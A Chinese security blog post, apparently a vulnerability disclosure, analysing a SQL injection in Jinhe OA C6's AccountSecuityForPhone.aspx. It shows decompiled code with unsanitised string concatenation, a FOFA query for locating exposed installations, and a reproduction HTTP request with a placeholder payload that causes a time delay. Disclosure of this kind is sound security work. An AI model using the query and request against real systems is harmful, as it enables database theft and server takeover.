---
title: "金和OA AccountSecuityForPhone.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html
asset_dir: assets/金和oa-accountsecuityforphone.aspx-sql注入漏洞
---

# 金和OA AccountSecuityForPhone.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/1 08:30
- 866浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

网络安全课程

SQL

技术文章订阅

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AccountSecuityForPhone.aspx` 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

漏洞扫描服务

网络安全培训

授权

根据 AccountSecuityForPhone.aspx 的源码，在 bin 目录下查找 JHBase.Web.AddMenu.dll 将其进行反编译后找到 AccountSecuityForPhone 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.initText();
  if (!this.IsPostBack)
  {
    this.DataBind(1);
    this.ListPage1.Buttons.Add("../JHsoft.UI.Lib/images/icon.toolbar/16px/delete.png", this.CancelSecuity);
  }
  this.ListPage1.PageChange += new DataGridPage.EventHandler(this.ListPage1_PageChange);
  this.ListPage1.ButtonClick += new UserWebControl.DataGrid.DataGrid.ButtonEventHandler(this.ListPage1_ButtonClick);
}
private void ListPage1_ButtonClick(object sender, string ButtonName)
{
  if (!string.op_Equality(ButtonName, this.CancelSecuity))
    return;
  if (this.account.CancelSecuity(this.ListPage1.Value) > 0)
  {
    this.DataBind(1);
    this.RegisterStartupScript("", $"<script>openAlertDialog('{this.strCancelOk}！','ok'); </script>");
  }
  else
    this.RegisterStartupScript("", $"<script>openAlertDialog('{this.strCancelErr}！','error'); </script>");
}
```

查询按钮查询时，会将**txtUser**带入`ListPage1_ButtonClick`方法，然后执行`DataBind`方法，跟进 `DataBind` 方法

```
private void DataBind(int pageNo)
{
  string strWhere = string.Empty;
  if (string.op_Inequality(((HtmlInputControl) this.txtUser).Value.Trim(), ""))
    strWhere = $" and username like '%{((HtmlInputControl) this.txtUser).Value.Trim()}%'";
  DataSet secuityData = this.account.GetSecuityData(strWhere, this.PageSize, pageNo);
```

参数 `txtUser` 被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.addmenu/AccountSecuityForPhone.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=YOUR___VIEWSTATE&txtUser=SQLI_POC&btnSearch=%E6%9F%A5%E8%AF%A2&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&__EVENTTARGET=&__EVENTARGUMENT=
```

[![金和OA AccountSecuityForPhone.aspx SQL注入漏洞](images/img-001-243cc59ded6f.webp)](https://image.mrxn.net/fc77815d36ba4007a0fbc21f1d2fe2d1.webp)

成功延时 5 秒

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
